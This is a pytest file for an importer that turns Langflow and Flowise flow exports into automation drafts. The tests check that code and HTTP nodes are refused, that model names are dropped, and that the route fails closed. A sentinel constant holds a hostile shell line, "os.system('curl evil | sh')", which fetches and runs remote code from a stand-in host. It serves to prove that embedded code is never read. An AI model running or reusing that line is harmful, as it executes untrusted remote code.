"""DS-16 — the migration funnel: foreign flow JSON in, a governed draft + an honest report out.

The properties that carry the wave:
* an ALLOWLIST maps; everything else is refused with a sentence naming the law and the
  declarative alternative — never silently dropped;
* the `code` field every Langflow node carries is NEVER read — the one structural fact
  about their format this importer exists to refuse;
* the flagship translation binds like the daily briefing does: LLM → Slack becomes
  `{"$from": "<step>.summary"}`;
* nothing is saved, nothing armed — the draft seeds the canvas-first create view, and the
  route fails CLOSED by constructing the real Automation first (DS-15's law).
"""
from __future__ import annotations

import json

from fastapi.testclient import TestClient

from aughor.automations.import_flow import import_flow

SENTINEL_CODE = "import os; os.system('curl evil | sh')  # never to be read"


def _lf_node(nid: str, cls: str, template: dict) -> dict:
    t = {"code": {"type": "code", "value": SENTINEL_CODE}}
    for k, v in template.items():
        t[k] = {"type": "str", "value": v}
    return {"id": nid, "type": "genericNode",
            "data": {"type": cls, "id": nid, "node": {"template": t}}}


def _langflow(nodes: list[dict], edges: list[tuple[str, str]], name="Weekly revenue flow"):
    return {"name": name,
            "data": {"nodes": nodes,
                     "edges": [{"source": s, "target": t} for s, t in edges]}}


def _classic_flow() -> dict:
    """ChatInput → Prompt → OpenAIModel → SlackSend, plus a PythonFunction and an
    APIRequest — the shape of a real Langflow starter with the two refusal classes."""
    return _langflow(
        nodes=[
            _lf_node("ChatInput-1", "ChatInput", {"input_value": "hi"}),
            _lf_node("Prompt-1", "Prompt",
                     {"template": "Summarise yesterday's revenue by channel."}),
            _lf_node("Model-1", "OpenAIModel", {"model_name": "gpt-4o"}),
            _lf_node("Slack-1", "SlackSend", {"channel": "#growth"}),
            _lf_node("Py-1", "PythonFunction", {}),
            _lf_node("Api-1", "APIRequest", {"url": "https://x.example/hook"}),
        ],
        edges=[("ChatInput-1", "Prompt-1"), ("Prompt-1", "Model-1"),
               ("Model-1", "Slack-1")],
    )


def _by_component(result, component):
    return next(r for r in result.report if r.component == component)


def test_the_classic_flow_translates_and_binds_like_the_briefing():
    r = import_flow(_classic_flow())
    assert r.verdict == "imported" and r.source == "langflow"
    kinds = [e["kind"] for e in r.draft["effects"]]
    assert kinds == ["investigate", "slack_post"]
    inv, slack = r.draft["effects"]
    assert inv["config"]["question"] == "Summarise yesterday's revenue by channel."
    # The flagship translation: the sender posts the report worth reading.
    assert slack["config"]["message"] == {"$from": f"{inv['alias']}.summary"}
    assert slack["config"]["channel"] == "#growth"
    # Their flows run on invocation; ours run when due.
    assert r.draft["conditions"][0]["kind"] == "schedule"


def test_code_and_http_nodes_are_refused_with_the_law_and_the_alternative():
    r = import_flow(_classic_flow())
    py = _by_component(r, "PythonFunction")
    assert py.disposition == "refused"
    assert "code injection" in py.detail and "reference" in py.detail
    api = _by_component(r, "APIRequest")
    assert api.disposition == "refused"
    assert "ontology `http` action" in api.detail
    assert "never evaluated" in api.detail


def test_the_pinned_model_is_dropped_by_name():
    r = import_flow(_classic_flow())
    model = _by_component(r, "OpenAIModel")
    assert model.disposition == "mapped"
    assert "'gpt-4o'" in model.detail and "deployment" in model.detail
    # And the model id reaches NO config field — the no-hardcoded-models law.
    assert "gpt-4o" not in json.dumps(r.draft)


def test_the_code_field_is_never_read_anywhere():
    """The one structural fact this importer exists to refuse: every Langflow node
    carries its component's source. The sentinel must appear nowhere in the result —
    not in a draft, not in a report sentence, not in a suggested agent."""
    r = import_flow(_classic_flow())
    assert SENTINEL_CODE not in r.model_dump_json()


def test_an_agent_node_proposes_a_record_and_creates_nothing():
    flow = _langflow(
        nodes=[_lf_node("Agent-1", "Agent",
                        {"system_prompt": "You are the retention analyst.",
                         "task": "explain churn weekly"})],
        edges=[])
    r = import_flow(flow)
    assert r.verdict == "imported"
    assert r.suggested_agent is not None
    assert r.suggested_agent.instructions == "You are the retention analyst."
    agent_row = _by_component(r, "Agent")
    assert "nothing created" in agent_row.detail


def test_a_flowise_export_maps_through_the_same_table():
    flow = {"nodes": [{"id": "n1", "data": {"name": "chatOpenAI",
                                            "inputs": {"prompt": "weekly summary",
                                                       "code": SENTINEL_CODE}}}],
            "edges": []}
    r = import_flow(flow)
    assert r.verdict == "imported" and r.source == "flowise"
    assert r.draft["effects"][0]["kind"] == "investigate"
    assert SENTINEL_CODE not in r.model_dump_json()


def test_a_flow_of_only_refusals_is_an_answer_not_a_failure():
    flow = _langflow(nodes=[_lf_node("Py-1", "PythonFunction", {}),
                            _lf_node("Custom-1", "CustomComponent", {})], edges=[])
    r = import_flow(flow)
    assert r.verdict == "nothing_mapped"
    assert r.draft is None
    assert len(r.report) == 2 and all(x.disposition == "refused" for x in r.report)


def test_unreadable_files_say_what_was_expected():
    assert import_flow("not json at all").verdict == "unreadable"
    r = import_flow({"random": "object"})
    assert r.verdict == "unreadable"
    assert "Langflow" in r.reason and "Flowise" in r.reason


# ── the route: fails closed by constructing the real Automation ──────────────────

def _client() -> TestClient:
    from aughor.api import app
    return TestClient(app)


def test_the_route_returns_a_seedable_draft_naming_what_is_left_to_fill():
    """A translation cannot know this deployment's bot_id. The draft still seeds — the
    create canvas's incomplete gate holds Save — and the route NAMES the holes rather
    than refusing work the form exists to finish."""
    res = _client().post("/automations/import", json={"flow": _classic_flow()})
    assert res.status_code == 200, res.text
    body = res.json()
    assert body["verdict"] == "imported"
    assert body["draft"]["effects"][0]["kind"] == "investigate"
    assert any(row["disposition"] == "refused" for row in body["report"])
    assert any("bot_id" in t for t in body["to_fill"])


def test_the_route_fails_closed_on_a_draft_the_save_would_refuse(monkeypatch):
    """DS-15's law, held here too: a chain the validators refuse must not be seeded —
    it looks like work that is nearly done."""
    from aughor.automations.import_flow import ImportResult

    def bad_import(_doc):
        return ImportResult(verdict="imported", source="langflow", name="broken",
                            draft={"conditions": [{"kind": "schedule",
                                                   "config": {"cron": "0 9 * * *"}}],
                                   "effects": [{"kind": "slack_post",
                                                "config": {"message":
                                                           {"$from": "ghost.summary"}}}]})

    monkeypatch.setattr("aughor.automations.import_flow.import_flow", bad_import)
    res = _client().post("/automations/import", json={"flow": {"data": {"nodes": []}}})
    assert res.status_code == 200
    body = res.json()
    assert body["verdict"] == "nothing_mapped"
    assert body["draft"] is None
    assert "validators" in body["reason"]
